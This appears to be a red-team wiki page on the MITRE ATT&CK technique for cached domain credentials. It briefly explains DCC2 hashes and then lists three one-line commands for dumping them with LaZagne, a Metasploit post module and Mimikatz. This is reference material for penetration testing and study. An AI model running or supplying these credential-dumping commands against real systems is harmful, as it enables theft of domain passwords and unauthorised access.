---
description: https://attack.mitre.org/techniques/T1003/005/
---

# Cached Domain Credentials

## T1003.005: Cached Domain Credentials

**Permissions Required:** <mark style="color:red;">SYSTEM</mark>

**Description**

Adversaries may attempt to access cached domain credentials used to allow authentication to occur in the event a domain controller is unavailable.

On Windows Vista and newer, the hash format is DCC2 (Domain Cached Credentials version 2) hash, also known as MS-Cache v2 hash. The number of default cached credentials varies and can be altered per system. This hash does not allow pass-the-hash style attacks, and instead requires [Password Cracking](https://attack.mitre.org/techniques/T1110/002) to recover the plaintext password.

## Techniques

**Note:** MS-Cache password hashes cannot be used in Pass-The-Hash (Pth) attacks. However, they can be cracked to reveal the clear-text password.

### LaZagne

```
LaZagne.exe windows
```

![](../../../../../../.gitbook/assets/lazagne-windows.png)

### Metasploit

```
use post/windows/gather/cachedump
```

![](<../../../../../../.gitbook/assets/image (2042) (1).png>)

### Mimikatz

```powershell
Invoke-Mimikatz -Command '"lsadump::cache"'
```

![](../../../../../../.gitbook/assets/Mimikatz-ldadump-cache.png)
